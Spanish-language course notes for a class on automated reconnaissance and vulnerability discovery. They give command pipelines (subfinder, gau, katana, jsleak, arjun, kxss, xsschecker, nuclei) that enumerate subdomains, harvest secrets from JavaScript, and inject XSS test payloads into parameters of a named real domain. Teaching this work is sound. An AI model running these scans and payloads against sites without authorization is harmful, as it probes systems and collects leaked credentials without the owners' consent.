# Comandos — Módulo 3 · Clase 1
## Recon Automatizado & Discovery de Vulnerabilidades

> **Target de práctica:** `educacionit.com` (academia de IT — uso educativo/con permiso)
> **Objetivo:** mapear la superficie de ataque, encontrar parámetros y candidatos a XSS/SQLi

---

## 🗺️ Fase 1 — Descubrir subdominios activos

```bash
# Enumerar subdominios con subfinder
subfinder -d educacionit.com -silent -o subdominios.txt

# Filtrar solo los que responden HTTP/HTTPS (descartar hosts muertos)
# En Kali usar httpx-toolkit en lugar de httpx
httpx-toolkit -l subdominios.txt -silent -p 80,443,8080 -o vivos.txt
```

> 💡 `httpx-toolkit` descarta subdominios que no responden, reduciendo el ruido en el pipeline.

---

## 🌐 Fase 2 — Recolectar URLs (históricas + activas)

```bash
# URLs históricas desde Wayback Machine, CommonCrawl, OTX, URLScan
cat vivos.txt | gau --threads 200 --o urls_pasivas.txt

# URLs activas: katana crawlea el sitio en tiempo real, incluyendo JavaScript
katana -u vivos.txt -d 3 -jc -silent -o urls_activas.txt

# Combinar ambas listas sin duplicados exactos
# anew agrega solo líneas nuevas (no repite)
cat urls_pasivas.txt urls_activas.txt | anew todas_las_urls.txt
```

> 💡 `gau` = pasado (historial), `katana` = presente (crawl en vivo). Usarlos juntos maximiza cobertura.

---

## 🧹 Fase 3 — Limpiar y deduplicar

```bash
# uro elimina URLs que son del mismo patrón (ej: ?id=1, ?id=2, ?id=3 → guarda solo una)
uro -i todas_las_urls.txt -o urls_limpias.txt
```

> 💡 Sin `uro` podés terminar con miles de URLs que son básicamente la misma. Reduce el set a patrones únicos.

---

## 🔍 Fase 4 — Extraer secretos desde archivos JavaScript

```bash
# Filtrar solo archivos .js del output de katana
cat urls_limpias.txt | grep -E "\.js$" >> archivos_js.txt

# jsleak analiza cada JS buscando:
# -s secrets (API keys, tokens, passwords hardcodeados)
# -l links (endpoints y rutas internas)
# -k verifica status code de cada link encontrado
# -c 150 = 150 workers concurrentes
cat archivos_js.txt | jsleak -s -l -k -c 150 | tee secretos_js.txt
```

> 💡 Es sorprendente cuántas apps tienen API keys o endpoints internos dentro del JS del frontend.

---

## 🎯 Fase 5 — Descubrir parámetros ocultos

```bash
# arjun fuzzea cada endpoint buscando parámetros no documentados
# -m GET,POST  → probar ambos métodos HTTP
# -t 50        → 50 threads (más = más rápido, cuidado con rate limiting)
arjun -i urls_limpias.txt -m GET,POST -t 50 -oT parametros_ocultos.txt
```

> 💡 Muchos parámetros vulnerables no aparecen en la URL pública — están ocultos. arjun los descubre por fuerza bruta.

---

## ⚡ Fase 6 — Detección de XSS

### 6a. kxss — Detectar reflejos de caracteres peligrosos

```bash
# gf xss filtra URLs con params típicamente vulnerables a XSS
# grep -vE excluye dominios que no son el target (evitar ruido)
# kxss inyecta chars especiales y reporta cuáles se reflejan sin codificar
cat urls_limpias.txt | gf xss | grep -vE "linkedin|whatsapp" | kxss | tee kxss.txt
```

> 💡 `kxss` no confirma XSS, detecta *posibilidades*. Un char reflejado sin encodear = candidato a explotar.

### 6b. xsschecker — Confirmar payload reflejado

```bash
# qsreplace reemplaza el valor de TODOS los params con el payload
# xsschecker verifica si el payload aparece en la respuesta
# -vuln = mostrar solo los vulnerables
cat urls_limpias.txt | gf xss \
  | qsreplace '"><script>alert(1)</script>' \
  | xsschecker -match 'alert(1)' -t 100 -vuln
```

> 💡 Este pipeline va de "miles de URLs" a "URLs con XSS confirmado" en segundos.

### 6c. Guardar candidatos para revisar con Burp/dalfox

```bash
# Guardar URLs candidatas a XSS para análisis manual o con dalfox
cat urls_limpias.txt | gf xss | grep -vE "linkedin|whatsapp" >> targetxss.txt
```

---

## 🔬 Fase 7 — Scanner de vulnerabilidades con Nuclei

```bash
# nuclei con modo DAST: prueba activamente las URLs
# -c 30 = 30 templates concurrentes
# -rl 50 = rate limit de 50 requests/segundo
cat urls_limpias.txt | nuclei -dast -c 30 -rl 50 -o resultados_nuclei.txt
```

> 💡 Nuclei tiene miles de templates para XSS, SQLi, SSRF, LFI, misconfigs, CVEs, etc. En modo `-dast` usa las URLs como entrada.

---

## 🔗 Pipeline completo (one-liner)

```bash
# De subdominio a candidatos XSS en un solo comando
subfinder -d target.com -silent \
  | httpx-toolkit -silent \
  | gau --threads 100 \
  | uro \
  | gf xss \
  | qsreplace '"><svg onload=alert(1)>' \
  | xsschecker -match 'alert(1)' -t 50 -vuln
```

---

## 🛠️ Herramientas usadas en esta clase

| Herramienta | Función | Instalación |
|---|---|---|
| `subfinder` | Enumeración de subdominios | `brew install subfinder` / `apt install subfinder` |
| `httpx-toolkit` | Probe HTTP (hosts vivos) | `brew install httpx` / `apt install httpx-toolkit` |
| `gau` | URLs históricas pasivas | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `katana` | Crawler activo + JS | `brew install katana` |
| `anew` | Deduplicar (append único) | `go install github.com/tomnomnom/anew@latest` |
| `uro` | Deduplicar patrones URL | `pip3 install uro` |
| `jsleak` | Secretos/links en JS | `go install github.com/byt3hx/jsleak@latest` |
| `arjun` | Descubrir params ocultos | `pip3 install arjun` |
| `gf` | Filtrar URLs por vuln | `go install github.com/tomnomnom/gf@latest` |
| `kxss` | Detectar reflejos XSS | `go install github.com/Emoe/kxss@latest` |
| `qsreplace` | Inyectar payloads en params | `go install github.com/tomnomnom/qsreplace@latest` |
| `xsschecker` | Confirmar XSS reflejado | `go install github.com/rix4uni/xsschecker@latest` |
| `nuclei` | Scanner de vulns | `brew install nuclei` |

> 📦 **Patrones GF:** https://github.com/d4rkrex/GF-patterns
> Clonar en `~/.gf/` para que `gf xss`, `gf sqli`, etc. funcionen.
